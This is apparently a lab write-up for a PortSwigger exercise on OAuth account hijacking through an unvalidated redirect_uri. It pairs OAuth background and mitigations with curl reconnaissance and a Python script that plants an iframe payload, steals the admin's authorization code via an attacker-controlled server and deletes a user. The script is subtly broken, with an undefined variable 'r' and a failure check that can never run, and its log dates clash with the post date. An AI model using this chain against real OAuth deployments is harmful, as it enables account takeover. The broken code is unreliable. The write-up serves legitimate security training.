---
title: "OAuth Account Hijacking via redirect_uri"
description: "How to exploit a misconfigured OAuth provider that doesn't validate the redirect_uri parameter, allowing an attacker to steal authorization codes and hijack user accounts."
labUrl: "https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri"
category: "OAuth"
date: "2025-03-04"
---

## Lab Description (contains spoilers)

This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: `wiener:peter`

## Necessary Background Concepts To Solve The Lab

### What is OAuth 2.0?

OAuth 2.0 is an authorization framework that allows third-party applications to access a user's resources without exposing their credentials. Instead of sharing passwords, OAuth uses **authorization codes** and **access tokens** to grant limited access.

**Think of OAuth like giving someone a temporary valet key for your car:**

- **Without OAuth**: You give someone your main car key (password). They can drive your car, open the trunk, access the glove box. Basically everything. If they lose it or steal it, they have full access to your car.

- **With OAuth**: You give them a special valet key (access token) that only opens the driver's door and starts the engine. They can't access the trunk or glove box. The key expires after a short time, and only works for specific cars (limited permissions).

The key players in an OAuth flow are:

- **Resource Owner**: The user who owns the data (e.g., the admin)
- **Client Application**: The website that wants to access the user's data (e.g., the blog)
- **OAuth Provider (Authorization Server)**: The service that authenticates the user and issues tokens (e.g., the social media login server)

**Real-world example**: When you click "Log in with Google" on a website, that website is the Client Application, Google is the OAuth Provider, and you are the Resource Owner. The website never sees your Google password. It just gets a temporary token to access basic profile information.

### The Authorization Code Flow

The most common OAuth flow works like this:

**Step-by-step breakdown:**

1. **User clicks "Log in with Social Media"** on the client app (e.g., clicking "Log in with Google" on a blog)

2. **Client app redirects user** to the OAuth provider's /auth endpoint with several parameters:
   - `client_id`: identifies the client application (like "this is the blog website")
   - `redirect_uri`: where to send the user back after authorization (like "send them back to https://blog.com/oauth-callback")
   - `response_type=code`: requests an authorization code (not direct access)
   - `scope`: what permissions are requested (like "I just need your email and profile picture")

3. **User authenticates** with the OAuth provider (enters their Google/Facebook credentials)

4. **User consents** to the requested permissions (sees a screen like "Allow this blog to access your email and profile?")

5. **OAuth provider redirects user back** to the `redirect_uri` with an authorization code:
   ```
   https://blog.com/oauth-callback?code=XYZ123ABC
   ```
   This is like getting a receipt that says "the user approved this request"

6. **Client app exchanges the code for an access token** (server-side, the blog sends the code back to Google saying "here's the receipt, now give me the actual key")

7. **Client app uses the access token** to access user resources (the blog can now fetch the user's profile info from Google using the temporary key)

**Why this two-step process?** The authorization code is short-lived and single-use. Even if an attacker intercepts it, they can only use it once and it expires quickly. The access token is what actually grants access, but it's exchanged server-to-server, never exposed to the user's browser.

### Why is redirect_uri Validation Critical?

The `redirect_uri` parameter specifies where the OAuth provider should send the authorization code after user authentication. Without strict validation, an attacker can modify this parameter to point to a server they control. When the victim authenticates, their authorization code is intercepted by the attacker instead of being delivered to the legitimate application.

**In OAuth terms:**
- **Secure**: The OAuth provider only redirects to pre-registered URLs (like `https://blog.com/oauth-callback`)
- **Vulnerable**: The OAuth provider redirects to whatever URL the attacker provides (like `https://evil-site.com/steal-code`)

**Why is this so dangerous?** Authorization codes are **bearer tokens**. Whoever has the code can exchange it for access to the victim's account. It's like finding someone's car keys. If you have them, you can drive the car.

In this lab, when the admin loads our malicious iframe, the OAuth provider sends their authorization code to our exploit server instead of the blog. We then use that code to log in as the admin.

## Writeup

First let's explore the lab and understand the application structure:

```bash
curl -s "https://<lab-url>.web-security-academy.net/" | cat
```

> **Command breakdown**: \
`-s` = silent mode (no progress meter) \
`| cat` = pipe response output to my [customized cat command](https://github.com/echoesofwhoami/echoes-bat-theme) for stylish display

The main page is a blog. In the navigation header we find:

```html
<a href=/>Home</a><p>|</p>
<a href="/my-account">My account</a><p>|</p>
```

There's also a link to the exploit server in the lab banner:

```html
<a id='exploit-link' class='button' target='_blank'
  href='https://exploit-<id>.exploit-server.net'>Go to exploit server</a>
```

Let's follow the "My account" link to see the OAuth login flow:

```bash
curl -s -D - "https://<lab-url>.web-security-academy.net/my-account"
```

> **Command breakdown**: \
`-D -` = dump response headers to stdout

Response:

```
HTTP/2 302
location: /social-login
set-cookie: session=KR7wbkOJP0jNRcaY6qaYPycEHmWmJILP; Secure; HttpOnly; SameSite=None
```

It redirects to `/social-login`. Let's follow it:

```bash
curl -s "https://<lab-url>.web-security-academy.net/social-login" \
  -b "session=KR7wbkOJP0jNRcaY6qaYPycEHmWmJILP"
```

The page contains a meta refresh tag that redirects to the OAuth provider:

```html
<meta http-equiv=refresh content='3;url=https://oauth-<oauth-id>.oauth-server.net/auth?client_id=bow9iv6dj8fca1ourlao4&redirect_uri=https://<lab-url>.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email'>
<p>We are now redirecting you to login with social media...</p>
```

This tells us everything about the OAuth configuration:

- **OAuth server**: `https://oauth-<oauth-id>.oauth-server.net`
- **Client ID**: `bow9iv6dj8fca1ourlao4`
- **redirect_uri**: `https://<lab-url>.web-security-academy.net/oauth-callback`
- **response_type**: `code` (authorization code flow)
- **scope**: `openid profile email`

Let's follow the full OAuth flow manually. First, hit the OAuth authorization endpoint:

```bash
curl -s -D - "https://oauth-<oauth-id>.oauth-server.net/auth?client_id=bow9iv6dj8fca1ourlao4&redirect_uri=https://<lab-url>.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email"
```

Response:

```
HTTP/2 302
location: /interaction/GSVAlvgrDIqNcFSmMcpkd
set-cookie: _interaction=GSVAlvgrDIqNcFSmMcpkd; ...
```

The OAuth server redirects to an interaction page (the login form). After logging in with `wiener:peter` and confirming consent, the OAuth server redirects back to:

```
HTTP/2 302
location: https://<lab-url>.web-security-academy.net/oauth-callback?code=Gc5tqgJyU6dMHC23d7yvLoPxd3z9j2MOHU97Xc-YK33
```

The authorization code is passed in the URL to the `redirect_uri`. This is the critical piece. If we can change where this redirect goes, we can steal the code.

### Testing the Vulnerability

Let's test if the OAuth provider validates the `redirect_uri` parameter by pointing it to our exploit server:

```bash
curl -s -D - "https://oauth-<oauth-id>.oauth-server.net/auth?client_id=bow9iv6dj8fca1ourlao4&redirect_uri=https://exploit-<exploit-id>.exploit-server.net&response_type=code&scope=openid%20profile%20email"
```

Response:

```
HTTP/2 302
location: /interaction/Mv8hr8rRWT08lq7hbcEqA
```

No error. The OAuth server accepted our arbitrary `redirect_uri` without any validation. This means after authentication, the authorization code will be sent to whatever URL we specify. Including our exploit server.

### The Exploit

The attack plan:

1. Craft an iframe that triggers the OAuth flow with `redirect_uri` pointing to our exploit server
2. Host it on the exploit server and deliver it to the admin victim
3. When the admin's browser loads the iframe, since they already have an active session with the OAuth provider, the authorization flow completes automatically. No login or consent needed
4. The OAuth provider redirects the admin to our exploit server with their authorization code in the URL
5. We read the code from the exploit server's access log
6. Use the stolen code to log in as admin

There are too many requests to do manually, so I'll show the flow with python:

```python
import requests
import re
import time

LAB = "https://<lab-url>.web-security-academy.net"
OAUTH = "https://oauth-<oauth-id>.oauth-server.net"
EXPLOIT = "https://exploit-<exploit-id>.exploit-server.net"

session_1 = requests.Session()

# Step 1: Extract client_id from the lab's OAuth login link
# The client_id is found in the meta refresh tag on the /my-account page
response_1 = session_1.get(f"{LAB}/my-account")

client_id = re.search(r'client_id=([a-zA-Z0-9]+)', r.text).group(1)

print(f"Found client_id: {client_id}")

# Step 2: Craft the malicious iframe
# When loaded by the victim, it will initiate an OAuth flow
# with redirect_uri pointing to our exploit server

iframe_payload = (
    f'<iframe src="{OAUTH}/auth?client_id={client_id}'
    f'&redirect_uri={EXPLOIT}'
    f'&response_type=code'
    f'&scope=openid%20profile%20email"></iframe>'
)

# Step 3: Store the exploit on the exploit server
session_1.post(f"{EXPLOIT}", data={
    "urlIs498": "/exploit",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
    "responseBody": iframe_payload,
    "formAction": "STORE"
})

# Step 4: Deliver the exploit to the victim (admin)
session_1.post(f"{EXPLOIT}", data={
    "urlIs498": "/exploit",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
    "responseBody": iframe_payload,
    "formAction": "DELIVER_TO_VICTIM"
})

# Step 5: Wait for the victim to trigger the exploit
time.sleep(3)

# Step 6: Read the exploit server logs to extract the stolen code
response_2 = session_1.get(f"{EXPLOIT}/log")

stolen_code = re.search(r"code=([A-Za-z0-9_-]+)", response_2.text).group(1)

if not stolen_code:
    print("Failed to steal code")
    exit(1)

print(f"Stolen authorization code: {stolen_code}")

# We create a new session (session_2) because we need a clean session context
# The first session (session_1) was used for exploit server interactions and contains
# cookies/state from the exploit server, not the target application
session_2 = requests.Session()

# Step 7: Use the stolen code to log in as admin
session_2.get(f"{LAB}/oauth-callback?code={stolen_code}", allow_redirects=True)

# Step 8: Access admin panel and delete carlos
response_3 = session_2.get(f"{LAB}/admin/delete?username=carlos")

print("Carlos deleted" if response_3.status_code == 200 else "Failed to delete carlos")
```

> **Script breakdown**: \
> The script automates the full exploit chain:
> 1. **Extracts client_id** from the lab's OAuth login configuration on the /my-account page
> 2. **Crafts an iframe** that initiates an OAuth flow with a tampered `redirect_uri` pointing to the attacker's exploit server
> 3. **Stores and delivers** the exploit via the lab's exploit server functionality
> 4. **Waits** for the admin victim to load the iframe. Since they have an active OAuth session, the flow completes silently and redirects to the exploit server with the authorization code
> 5. **Extracts** the stolen authorization code from the exploit server's access logs
> 6. **Uses the stolen code** to complete the OAuth callback on the blog application, gaining an admin session
> 7. **Deletes carlos** via the admin panel

Expected similar output:

```
Stolen authorization code: OTy3aQ-1n6qA8w5jQcqWH_parimQeFvX2PsGkVHkkNa
Carlos deleted
```

The exploit server logs show exactly what happened when the admin victim loaded our malicious iframe:

```
10.0.3.152  2026-03-04 16:19:08 +0000 "GET /exploit/ HTTP/1.1" 200
  "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

10.0.3.152  2026-03-04 16:19:08 +0000 "GET /?code=OTy3aQ-1n6qA8w5jQcqWH_parimQeFvX2PsGkVHkkNa HTTP/1.1" 200
  "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

The first request is the victim loading the exploit page. \
The second is the OAuth provider redirecting the victim's browser to our server with the authorization code. \
**The admin's account was hijacked with a single iframe, annihilating carlos in the process.**

## Mitigation

1. **Strictly validate redirect_uri**: The OAuth provider must enforce an exact match between the registered `redirect_uri` and the one provided in the authorization request. Wildcard or partial matching should never be allowed
2. **Use the `state` parameter**: Include a cryptographically random `state` parameter in authorization requests and validate it on callback. This prevents CSRF attacks and makes stolen codes harder to use
3. **Use PKCE (Proof Key for Code Exchange)**: PKCE adds a code verifier/challenge mechanism that binds the authorization code to the client that initiated the flow, making stolen codes useless without the original verifier
4. **Short-lived authorization codes**: Authorization codes should expire quickly (within seconds) and be single-use to minimize the window for exploitation
5. **Register exact redirect URIs**: Client applications should register specific, complete redirect URIs with the OAuth provider. Never use pattern matching or allow dynamic redirect URIs
